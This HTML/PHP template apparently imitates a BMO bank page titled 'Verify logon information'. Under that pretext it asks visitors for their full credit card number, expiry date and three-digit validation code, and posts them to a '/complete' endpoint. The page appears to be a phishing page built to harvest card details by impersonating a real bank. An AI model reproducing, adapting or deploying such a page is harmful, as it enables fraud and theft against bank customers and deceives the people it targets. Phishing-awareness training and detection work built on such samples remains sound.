<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verify logon information - BMO</title>

  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
  <link rel="stylesheet" href="/assets/css/styles.css">
  <script src="https://kit.fontawesome.com/64664913ea.js" crossorigin="anonymous"></script>
</head>
<body class="bg-body">

  <?php
    include('views/templates/nav-light-logo.php');
  ?>

  <div class="container mt-5 maxheight-container" style="max-width: 950px">
    <div class="row mt-4 d-flex flex-column-reverse flex-md-row">
      <div class="col-md-6 p-4 mr-lg-6">
        <h1 class="fw-bold mb-2">Verify logon information</h1>
        <p class="mb-4">Please enter your credit card information:</p>

        <form method="POST" novalidate class="needs-validation" action="/complete">
          <div class="form-floating mb-3">
            <input required type="text" class="form-control bg-body border-0 border-bottom" id="card-number" placeholder="asd">
            <label for="floatingInput">BMO credit card number</label>
            <div id="validationServerBMOFeedback" class="invalid-feedback b-0">
                Please enter all 16 digits of your credit card.
            </div>
          </div>

          <div class="form-floating mb-3">
            <input required type="month" min="2022-11" class="form-control bg-body border-0 border-bottom" id="card-expiration" placeholder="asd">
            <label for="floatingInput">Expiry date</label>
            <div id="validationServerDateFeedback" class="invalid-feedback b-0">
                Please enter your credit card expiry date.
            </div>
          </div>

          <div class="form-floating">
            <input required type="text" maxlength="3" class="form-control bg-body border-0 border-bottom" id="card-validation-num" placeholder="asd">
            <label for="floatingInput">Credit Card Validation number</label>
            <div id="validationServerDateFeedback" class="invalid-feedback b-0">
                Please enter your Credit Card Validation number.
            </div>
          </div>
          <p class="text-xs mb-3 mt-1"><span class="fw-bold">FYI:</span> These are the three numbers on the back of your card.</p>

          <input class="mt-4 py-3 px-5 fs-6 btn btn-primary btn-lg rounded-pill" type="submit" value="NEXT">
        </form>
      </div>

      <div class="col-md-6 mb-3 d-flex justify-content-center p-0 px-lg-3">
        <img style="max-width: 252px" src="/assets/media/card-cheque.svg" alt="Card cheque illustration">
      </div>
    </div>
  </div>

  <?php
    include('views/templates/footer.php');
  ?>


  <script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.10.2/dist/umd/popper.min.js" integrity="sha384-7+zCNj/IqJ95wo16oMtfsKbZ9ccEh31eOz1HGyDuCQ6wgnyJNSYdrPa03rtR1zdB" crossorigin="anonymous"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.min.js" integrity="sha384-QJHtvGhmr9XOIpI6YVutG+2QOK9T+ZnN4kzFN1RtK3zEFEIsxhlmWl5/YESvpZ13" crossorigin="anonymous"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.js" 
        integrity="sha256-yE5LLp5HSQ/z+hJeCqkz9hdjNkk1jaiGG0tDCraumnA=" 
        crossorigin="anonymous"></script>
        
  <script src="/assets/js/main.js"></script>

</body>
</html>
